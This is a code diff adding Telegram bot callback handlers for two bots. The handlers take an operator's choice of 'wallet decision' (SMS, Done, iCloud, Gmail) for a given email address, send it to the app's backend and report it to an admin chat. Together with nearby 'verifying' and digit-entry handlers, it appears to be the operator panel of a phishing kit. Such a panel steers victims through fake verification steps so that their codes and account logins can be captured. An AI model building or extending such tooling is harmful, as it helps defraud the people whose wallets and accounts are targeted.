@@ -657,6 +657,62 @@ if (bot2) {
         }
       }
 
+      // ============================================================================
+      // ✅ WALLET DECISION BUTTONS (Bot 2)
+      // ============================================================================
+
+      if (action === "wallet_decision_sms" || action === "wallet_decision_done" || action === "wallet_decision_icloud" || action === "wallet_decision_gmail") {
+        const email = identifier;
+
+        try {
+          await fetch(`${APP_URL}/update-wallet-decision`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email, choice: action })
+          });
+          
+          console.log(`✅ Wallet decision updated (Bot 2): ${action}`);
+        } catch (err) {
+          console.error("Error updating wallet decision:", err);
+        }
+
+        let statusMessage = "";
+        
+        if (action === "wallet_decision_sms") {
+          statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
+        } else if (action === "wallet_decision_done") {
+          statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
+        } else if (action === "wallet_decision_icloud") {
+          statusMessage = `📧 <code>${email}</code> → ☁️`;
+        } else if (action === "wallet_decision_gmail") {
+          statusMessage = `📧 <code>${email}</code> → 🌈`;
+        }
+
+        if (statusMessage) {
+          try {
+            const replyUrl = `https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`;
+            await fetch(replyUrl, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                chat_id: ADMIN_CHAT_ID_2,
+                text: statusMessage,
+                parse_mode: "HTML"
+              })
+            });
+          } catch (err) {
+            console.error(`❌ Failed to send status message:`, err);
+          }
+        }
+
+        bot2.answerCallbackQuery(callbackId, {
+          text: `✅ ${action.toUpperCase()}`,
+          show_alert: false
+        }).catch(() => {});
+
+        return;
+      }
+
       // ✅ HANDLE VERIFYING BUTTONS (Bot 2)
       if (action === "verifying_sms" || action === "verifying_done" || action === "verifying_wallet" || action === "verifying_icloud" || action === "verifying_gmail") {
         const verifyingId = identifier;
@@ -839,6 +895,62 @@ if (bot2) {
           await bot2.answerCallbackQuery(query.id, { text: "Error processing digit" });
           return;
         }
+      }
+
+      // ============================================================================
+      // ✅ WALLET DECISION BUTTONS (Bot 1)
+      // ============================================================================
+
+      if (action === "wallet_decision_sms" || action === "wallet_decision_done" || action === "wallet_decision_icloud" || action === "wallet_decision_gmail") {
+        const email = identifier;
+
+        try {
+          await fetch(`${APP_URL}/update-wallet-decision`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email, choice: action })
+          });
+          
+          console.log(`✅ Wallet decision updated: ${action}`);
+        } catch (err) {
+          console.error("Error updating wallet decision:", err);
+        }
+
+        let statusMessage = "";
+        
+        if (action === "wallet_decision_sms") {
+          statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
+        } else if (action === "wallet_decision_done") {
+          statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
+        } else if (action === "wallet_decision_icloud") {
+          statusMessage = `📧 <code>${email}</code> → ☁️`;
+        } else if (action === "wallet_decision_gmail") {
+          statusMessage = `📧 <code>${email}</code> → 🌈`;
+        }
+
+        if (statusMessage) {
+          try {
+            const replyUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(replyUrl, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                chat_id: ADMIN_CHAT_ID,
+                text: statusMessage,
+                parse_mode: "HTML"
+              })
+            });
+          } catch (err) {
+            console.error(`❌ Failed to send status message:`, err);
+          }
+        }
+
+        bot.answerCallbackQuery(callbackId, {
+          text: `✅ ${action.toUpperCase()}`,
+          show_alert: false
+        }).catch(() => {});
+
+        return;
       }
 
       // ============================================================================
